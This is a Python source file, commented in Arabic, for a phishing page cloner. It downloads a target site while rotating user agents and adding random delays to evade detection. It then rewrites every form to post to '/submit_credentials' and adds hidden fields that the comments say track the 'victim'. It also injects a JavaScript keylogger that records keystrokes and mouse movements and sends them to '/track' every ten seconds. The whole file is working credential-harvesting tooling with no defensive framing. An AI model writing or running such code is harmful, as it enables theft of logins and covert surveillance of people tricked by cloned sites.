import requests
from bs4 import BeautifulSoup
import random
import time
import os
import re
from urllib.parse import urlparse

class AdvancedPageCloner:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.user_agents = self.config.get("stealth", "user_agents")
        
    def clone_advanced(self, target_url):
        """استنساخ صفحة متقدم مع تقنيات تجنب"""
        try:
            # اختيار User-Agent عشوائي
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            }
            
            # إضافة تأخير عشوائي
            time.sleep(random.uniform(0.5, 2.0))
            
            # طلب الصفحة
            response = self.session.get(target_url, headers=headers, timeout=10)
            response.raise_for_status()
            
            # تحليل HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # تعديل جميع النماذج
            forms_modified = 0
            for form in soup.find_all('form'):
                original_action = form.get('action', '')
                
                # استبدال action بالخادم الخاص بنا
                form['action'] = "/submit_credentials"
                
                # إضافة حقول مخفية لتتبع الضحية
                hidden_inputs = {
                    'original_url': target_url,
                    'timestamp': str(int(time.time())),
                    'session_id': os.urandom(8).hex()
                }
                
                for name, value in hidden_inputs.items():
                    hidden_tag = soup.new_tag('input')
                    hidden_tag['type'] = 'hidden'
                    hidden_tag['name'] = name
                    hidden_tag['value'] = value
                    form.append(hidden_tag)
                
                forms_modified += 1
            
            # تعديل الروابط لتبقى داخل الموقع
            for link in soup.find_all('a', href=True):
                if link['href'].startswith('http'):
                    link['href'] = '#'
                elif link['href'].startswith('/'):
                    link['href'] = '#'
            
            # إضافة سكريبت تتبع متقدم
            tracking_script = '''
            <script>
            // تتبع متقدم
            const tracker = {
                initTime: Date.now(),
                keysPressed: [],
                mouseMovements: [],
                
                startTracking: function() {
                    document.addEventListener('keydown', (e) => {
                        this.keysPressed.push({
                            key: e.key,
                            code: e.code,
                            time: Date.now() - this.initTime
                        });
                    });
                    
                    document.addEventListener('mousemove', (e) => {
                        this.mouseMovements.push({
                            x: e.clientX,
                            y: e.clientY,
                            time: Date.now() - this.initTime
                        });
                    });
                    
                    // إرسال البيانات كل 10 ثواني
                    setInterval(() => {
                        if (this.keysPressed.length > 0 || this.mouseMovements.length > 0) {
                            fetch('/track', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    keys: this.keysPressed,
                                    mouse: this.mouseMovements
                                })
                            });
                            this.keysPressed = [];
                            this.mouseMovements = [];
                        }
                    }, 10000);
                }
            };
            
            // بدء التتبع عند تحميل الصفحة
            window.addEventListener('load', () => tracker.startTracking());
            </script>
            '''
            
            # إضافة السكريبت قبل </body>
            if soup.body:
                soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
            
            # حفظ الصفحة المستنسخة
            domain = urlparse(target_url).netloc
            filename = f"data/templates/cloned_{domain}_{int(time.time())}.html"
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            return {
                'success': True,
                'filename': filename,
                'forms_modified': forms_modified,
                'original_url': target_url,
                'clone_time': time.time()
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'timestamp': time.time()
            }
